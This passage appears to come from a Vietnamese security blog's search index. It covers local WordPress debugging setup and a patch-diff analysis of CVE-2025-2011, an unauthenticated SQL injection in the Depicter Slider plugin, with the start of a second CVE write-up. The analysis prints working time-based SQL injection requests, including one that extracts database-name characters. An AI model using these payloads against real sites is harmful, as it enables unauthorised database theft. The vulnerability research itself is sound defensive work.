9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size M·∫∑c ƒë·ªãnh, WordPress ph·ª• thu·ªôc v√†o c·∫•u h√¨nh PHP (upload_max_filesize, post_max_size, v√† ƒë√¥i khi c·∫£ max_execution_time) ƒë·ªÉ x√°c ƒë·ªãnh dung l∆∞·ª£ng file t·ªëi ƒëa c√≥ th·ªÉ upload. Tr√™n nhi·ªÅu hosting, gi·ªõi h·∫°n n√†y ch·ªâ kho·∫£ng 2MB ‚Äì 8MB, kh√¥ng ƒë·ªß cho c√°c plugin hi·ªán ƒë·∫°i.\nWhy Increase the Limit? Plugin dung l∆∞·ª£ng l·ªõn: C√°c plugin nh∆∞ WooCommerce extension, page builder, backup, ho·∫∑c security suite c√≥ th·ªÉ n·∫∑ng 20MB ‚Äì 100MB.\nTr√°nh l·ªói upload: N·∫øu file .zip l·ªõn h∆°n gi·ªõi h·∫°n, b·∫°n s·∫Ω g·∫∑p l·ªói:\n‚ÄúThe uploaded file exceeds the upload_max_filesize directive in php.ini‚Äù Ho·∫∑c upload th·∫•t b·∫°i. Thu·∫≠n ti·ªán cho qu·∫£n tr·ªã vi√™n: C√≥ th·ªÉ c√†i tr·ª±c ti·∫øp qua Dashboard m√† kh√¥ng c·∫ßn FTP/SSH.\nH·ªó tr·ª£ ph√°t tri·ªÉn plugin: Plugin t·ª± vi·∫øt k√®m nhi·ªÅu th∆∞ vi·ªán/asset c√≥ th·ªÉ kh√° n·∫∑ng, vi·ªác tƒÉng gi·ªõi h·∫°n gi√∫p test d·ªÖ d√†ng h∆°n.\nHow to Increase Plugin Upload Size S·ª≠a php.ini (n·∫øu c√≥ quy·ªÅn server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 S·ª≠a file .htaccess (n·∫øu d√πng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Th√™m v√†o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); üëâ L·ªùi khuy√™n: Ch·ªâ n√™n ƒë·∫∑t gi·ªõi h·∫°n v·ª´a ƒë·ªß (64MB ho·∫∑c 128MB). Tr√°nh ƒë·∫∑t qu√° l·ªõn ƒë·ªÉ h·∫°n ch·∫ø nguy c∆° b·ªã upload file n·∫∑ng g√¢y qu√° t·∫£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Depicter Slider c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.6.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-2011 Product: WordPress Depicter Slider Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 3.6.1 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Depicter Slider: v3.6.1(vul) v√† v3.6.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file app/src/Controllers/Ajax/LeadsAjaxController.php\nindex, list, export l√† 3 h√†m ƒë√°ng ch√∫ √Ω n·∫±m trong class LeadsAjaxController\npublic function index(RequestInterface $request, $view) { $args = [ \u0026#39;s\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;s\u0026#39;, \u0026#39;\u0026#39;)), // other logic ]; $response = \\Depicter::lead()-\u0026gt;get($args); $statusCode = isset($response[\u0026#39;errors\u0026#39;]) ? 400 : 200; return \\Depicter::json($response)-\u0026gt;withStatus($statusCode); } {: file=\u0026ldquo;app/src/Controllers/Ajax/LeadsAjaxController.php v3.2\u0026rdquo; }\npublic function list(RequestInterface $request, $view) { $args = [ \u0026#39;s\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;s\u0026#39;, \u0026#39;\u0026#39;)), // other logic ]; $response = \\Depicter::leadRepository()-\u0026gt;getResults($args); return \\Depicter::json($response); } {: file=\u0026ldquo;app/src/Controllers/Ajax/LeadsAjaxController.php v3.2\u0026rdquo; }\npublic function export(RequestInterface $request, $view) { $args = [ \u0026#39;s\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;s\u0026#39;, \u0026#39;\u0026#39;)), // other logic ]; $response = \\Depicter::leadRepository()-\u0026gt;getResults($args); // other logic return \\Depicter::json([ \u0026#39;errors\u0026#39; =\u0026gt; [__(\u0026#39;error occurred during the export process\u0026#39;, \u0026#39;depicter\u0026#39;)] ])-\u0026gt;withStatus(400); } {: file=\u0026ldquo;app/src/Controllers/Ajax/LeadsAjaxController.php v3.2\u0026rdquo; }\nC·∫£ 3 h√†m ƒë·ªÅu ƒë∆∞·ª£c v√° b·∫±ng c√°ch s·ª≠ d·ª•ng Sanitize::sql thay cho Sanitize::textfield nh·∫±m ƒë·∫£m b·∫£o param 's' ƒë∆∞·ª£c l√†m s·∫°ch v√† escape ph√π h·ª£p cho ng·ªØ c·∫£nh c√¢u l·ªánh SQL.\nHow it work? ƒê·ªÉ hi·ªÉu r√µ h∆°n ch·ª©c nƒÉng c·ªßa textfield v√† sql ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a function textfield, c√≥ l·∫Ω ch√∫ng ƒë∆∞·ª£c ƒë·∫∑t trong c√πng 1 file v√¨ ƒë∆∞·ª£c g·ªçi b·∫±ng c√πng 1 class Sanitize\nN·∫øu b·∫°n ƒë√£ c√†i PHP Intelephense Extension trong vscode, b·∫°n c√≥ th·ªÉ di chuy·ªÉn ƒë·∫øn h√†m c·ª• th·ªÉ b·∫±ng c√°ch Ctrl + Click v√†o h√†m c·∫ßn ƒë·∫øn. {: .prompt-tip }\ntextfield tr·∫£ v·ªÅ d·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c sanitize b·∫±ng sanitize_text_field, sql c≈©ng l√† h√†m trong c√πng class, tr·∫£ v·ªÅ d·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c escape SQL\npublic static function sql( $input ) { return esc_sql( $input ); } {: file=\u0026ldquo;vendor/averta/wordpress/src/Utility/Sanitize.php v3.2\u0026rdquo; }\nV√¨ ƒë√¢y l√† l·ªó h·ªïng unauthenticated, vi·ªác c√≥ 3 h√†m nh∆∞ n√†y, ta c·∫ßn x√°c ƒë·ªãnh xem ƒëi·ªÉm g·ªçi ƒë·∫øn ch√∫ng c√≥ c∆° ch·∫ø x√°c th·ª±c hay kh√¥ng. Ch·ªâ sau khi ch·∫Øc ch·∫Øn r·∫±ng h√†m n√†o th·ª±c s·ª± ƒë∆∞·ª£c g·ªçi trong b·ªëi c·∫£nh kh√¥ng y√™u c·∫ßu x√°c th·ª±c, ta m·ªõi ti·∫øp t·ª•c ph√¢n t√≠ch ph·∫ßn logic b√™n trong ƒë·ªÉ ki·ªÉm tra kh·∫£ nƒÉng g√¢y ra SQL Injection gi√∫p gi·ªõi h·∫°n ph·∫°m vi truy v·∫øt.\nƒê·ªÉ x√°c ƒë·ªãnh 3 h√†m tr√™n ƒë∆∞·ª£c g·ªçi ·ªü ƒë√¢u, ta c√≥ th·ªÉ t√¨m ki·∫øm tr·ª±c ti·∫øp theo t√™n h√†m. Tuy nhi√™n, c√°c t·ª´ kh√≥a nh∆∞ index, list, hay export l·∫°i qu√° ph·ªï bi·∫øn n√™n k·∫øt qu·∫£ t√¨m ki·∫øm s·∫Ω r·∫•t nhi·ªÅu v√† kh√≥ l·ªçc. V√¨ v·∫≠y, thay v√¨ t√¨m theo t√™n h√†m, ta t√¨m v·ªõi t·ª´ kh√≥a l√† t√™n class LeadsAjaxController. B·ªüi l·∫Ω khi ƒë∆∞·ª£c s·ª≠ d·ª•ng, c√°c h√†m n√†y ƒë·ªÅu ph·∫£i ƒë∆∞·ª£c g·ªçi th√¥ng qua class, nh·ªù ƒë√≥ ph·∫°m vi k·∫øt qu·∫£ t√¨m ki·∫øm s·∫Ω ƒë∆∞·ª£c thu h·∫πp v√† d·ªÖ d√†ng h∆°n.\nüëâ LeadsAjaxController ƒë∆∞·ª£c s·ª≠ d·ª•ng trong qu√° tr√¨nh ƒëƒÉng k√Ω route Ajax. Khi c√≥ request g·ª≠i t·ªõi endpoint /wp-admin/admin-ajax.php?action=action_here\u0026amp;param1=param1_here\u0026amp;paramN=paramN_here, h·ªá th·ªëng s·∫Ω d·ª±a tr√™n khai b√°o handle('LeadsAjaxController@function') ƒë·ªÉ g·ªçi t·ªõi ph∆∞∆°ng th·ª©c t∆∞∆°ng ·ª©ng trong class LeadsAjaxController\nC·∫£ ba h√†m ta ƒëang focus ƒë·ªÅu ƒë∆∞·ª£c g·ªçi b·∫±ng ph∆∞∆°ng th·ª©c GET, nh∆∞ng export l·∫°i c√≥ middleware x·ª≠ l√Ω csrf-api, n√™n ta b·ªè qua. Ch·ªâ truy v·∫øt index v√† list\nKhi ph√¢n t√≠ch hai h√†m n√†y, ta th·∫•y trong h√†m index, bi·∫øn $response ƒë∆∞·ª£c g√°n gi√° tr·ªã t·ª´ \\Depicter::lead()-\u0026gt;get($args). Tuy nhi√™n, ph∆∞∆°ng th·ª©c get() l·∫°i ti·∫øp t·ª•c g·ªçi ƒë·∫øn \\Depicter::leadRepository()-\u0026gt;getResults($args), t·ª©c l√† c√πng m·ªôt logic m√† h√†m list ƒë√£ g·ªçi tr·ª±c ti·∫øp. Do ƒë√≥, ta ch·ªçn h√†m list l√†m ƒëi·ªÉm truy v·∫øt ch√≠nh.\npublic function list(RequestInterface $request, $view) { $args = [ \u0026#39;s\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;s\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;ids\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;ids\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;sources\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;sources\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;dateStart\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;dateStart\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;dateEnd\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;dateEnd\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;order\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;order\u0026#39;, \u0026#39;DESC\u0026#39;)), \u0026#39;orderBy\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;orderBy\u0026#39;, \u0026#39;id\u0026#39;)), \u0026#39;page\u0026#39; =\u0026gt; Sanitize::int($request-\u0026gt;query(\u0026#39;page\u0026#39;, 1)), \u0026#39;perPage\u0026#39; =\u0026gt; Sanitize::int($request-\u0026gt;query(\u0026#39;perpage\u0026#39;, 10)), \u0026#39;columns\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;columns\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;includeFields\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;includeFields\u0026#39;, false)), \u0026#39;skipCustomFields\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;skipCustomFields\u0026#39;, false)) ]; $response = \\Depicter::leadRepository()-\u0026gt;getResults($args); return \\Depicter::json($response); } {: file=\u0026ldquo;app/src/Controllers/Ajax/LeadsAjaxController.php v3.2\u0026rdquo; }\nƒê·ªÉ bi·∫øt getResults th·ª±c thi query nh∆∞ n√†o, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a function getResults ho·∫∑c Ctrl + Click v√†o getResults\nüëâ Khi t√¨m ki·∫øm, ta th·∫•y k·∫øt qu·∫£ c√≥ hai h√†m getResults. D·ª±a v√†o t√™n class c√≥ th·ªÉ nh·∫≠n th·∫•y s·ª± li√™n quan gi·ªØa class LeadRepository v√† h√†m leadRepository(), nhi·ªÅu kh·∫£ nƒÉng Depicter::leadRepository() s·∫Ω tr·∫£ v·ªÅ m·ªôt instance c·ªßa class LeadRepository. B√™n c·∫°nh ƒë√≥, ta c√≥ th·ªÉ d·ª±a v√†o s·ªë l∆∞·ª£ng tham s·ªë truy·ªÅn v√†o ƒë·ªÉ x√°c ƒë·ªãnh ch√≠nh x√°c h√†m getResults n√†o m·ªõi l√† h√†m c·∫ßn ph√¢n t√≠ch.\nTa th·∫•y ƒëi·ªÅu ki·ªán if,khi kh√¥ng c√≥ param includeFields th√¨ getLeadsResults s·∫Ω ƒë∆∞·ª£c g·ªçi, quan s√°t getLeadsResults trong c√πng class:\nprotected function getLeadsResults( $args ){ // Purpose of joining tables is being able to search in leadField values as well $leadTable = $this-\u0026gt;lead()-\u0026gt;getTable(); $leads = Lead::new()-\u0026gt;select( \u0026#34;{$leadTable}.id\u0026#34;, \u0026#34;{$leadTable}.source_id\u0026#34;, \u0026#34;{$leadTable}.content_id\u0026#34;, \u0026#34;{$leadTable}.content_name\u0026#34;, \u0026#34;{$leadTable}.created_at\u0026#34;, \u0026#34;lf.name as fieldName\u0026#34;, \u0026#34;lf.value as fieldValue\u0026#34; )-\u0026gt;join( \u0026#34;{$this-\u0026gt;leadField()-\u0026gt;getTable()} AS lf\u0026#34;, \u0026#34;{$leadTable}.id\u0026#34;, \u0026#34;=\u0026#34;, \u0026#34;lf.lead_id\u0026#34; ); // other logic if( ! empty( $args[\u0026#39;s\u0026#39;] ) ){ $search = \u0026#34;\u0026#39;%\u0026#34;. $args[\u0026#39;s\u0026#39;] .\u0026#34;%\u0026#39;\u0026#34;; $leads-\u0026gt;appendRawWhere(\u0026#39;AND\u0026#39;, \u0026#34;( lf.value like {$search} OR {$leadTable}.content_name like {$search} )\u0026#34;); } $results = $this-\u0026gt;paginate( $leads, $args ); } {: file=\u0026ldquo;app/src/Database/Repository/LeadRepository.php v3.2\u0026rdquo; }\nTa th·∫•y param s, n∆°i ƒë∆∞·ª£c b·∫£n v√° b·∫£o v·ªá ƒë√£ ƒë∆∞·ª£c n·ªëi tr·ª±c ti·∫øp v√†o c√¢u query b·∫±ng h√†m appendRawWhere. Khi ƒë√≥ 1 ph·∫ßn query t∆∞∆°ng ·ª©ng s·∫Ω l√†:\nAND (lf.value like \u0026#39;%s_here%\u0026#39; OR leadtable.content_name like \u0026#39;%s_here%\u0026#39;) üëâ Nh∆∞ v·∫≠y khi g·ª≠i GET request ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi params:\naction=depicter-lead-index\u0026amp;s=payload_here list ƒë∆∞·ª£c g·ªçi v·ªõi duy nh·∫•t param s ƒë∆∞·ª£c th√™m v√†o $args, c√≤n l·∫°i ƒë∆∞·ª£c set gi√° tr·ªã m·∫∑c ƒë·ªãnh getResults ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë $args ƒêi·ªÅu ki·ªán if( ! $args['includeFields'] ) trong getResults khi includeFields m·∫∑c ƒë·ªãnh l√† false =\u0026gt; getLeadsResults ƒë∆∞·ª£c g·ªçi Th·ª±c hi·ªán truy v·∫•n g√¢y l·ªói SQLi Exploit Detect SQLi G·ª≠i GET request ch·ª©a payload SQLi.\nGET /wp-admin/admin-ajax.php?action=depicter-lead-list\u0026amp;s=999%25\u0026#39;+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a))+--+-+ HTTP/1.1 Host: localhost ... Cookie: cookie_here Payload ƒë∆∞·ª£c decode:\n999%\u0026#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- - Khi ƒë√≥ m·ªôt ph·∫ßn c·ªßa c√¢u query tr·ªü th√†nh\nAND (lf.value like \u0026#39;999%\u0026#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- \u0026#39; OR leadtable.content_name like \u0026#39;999%\u0026#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) #\u0026#39;) üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nSubquery trong m·ªánh ƒë·ªÅ FROM: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh.\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nGET /wp-admin/admin-ajax.php?action=depicter-lead-list\u0026amp;s=999%25\u0026#39;+AND+(SELECT+1+FROM+(SELECT+IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1))a))+--+-+ HTTP/1.1 Host: localhost ... Cookie: cookie_here S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ s ƒë∆∞·ª£c l·∫•y t·ª´ GET request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress v√† b·ªüi sanitize_text_field.\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nD·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript here\nConclusion L·ªó h·ªïng CVE-2025-2011 trong plugin WordPress Depicter Slider tr∆∞·ªõc phi√™n b·∫£n 3.6.2, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ƒë√£ escape SQL khi·∫øn d·ªØ li·ªáu tr∆∞·ªõc khi ƒë∆∞a v√†o tr·ªü th√†nh chu·ªói thu·∫ßn kh√¥ng th·ªÉ tho√°t ra kh·ªèi '%...%'\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Depicter Slider Plugin \u0026lt;= 3.6.1 is vulnerable to SQL Injection ","permalink":"//localhost:1313/vi/posts/2025-09-11-cve-2025-2011/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eDepicter Slider\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e3.6.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-2011\"\u003eCVE-2025-2011\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/depicter/\"\u003eWordPress Depicter Slider Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 3.6.1\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e:  High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDepicter Slider\u003c/strong\u003e:  v3.6.1(vul) v√† v3.6.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-2011"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Woocommerce Partial Shipment c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.3. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-48118 Product: WordPress Woocommerce Partial Shipment Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 3.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Woocommerce Partial Shipment: v3.2(vul) v√† v3.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Actived WooCommerce plugin: plugin b·∫Øt bu·ªôc actived tr∆∞·ªõc khi c√†i Woocommerce Partial Shipment Plugin, m·ªôt s·ªë h√†m trong WooCommerce s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng. Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ POST request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file wc-partial-shipment/woocommerce-partial-shipment.php\nNh∆∞ng ·ªü ƒë√¢y, dev thay ƒë·ªïi kh√° nhi·ªÅu ta kh√≥ ƒë·ªÉ t√¨m ƒë∆∞·ª£c v·ªã tr√≠ l·ªói.\nTrong WordPress, ƒë·ªÉ SQLi x·∫£y ra, ·ª©ng d·ª•ng ph·∫£i t∆∞∆°ng t√°c v·ªõi database th√¥ng qua bi·∫øn global $wpdb, ta search t·ª´ kh√≥a n√†y trong file 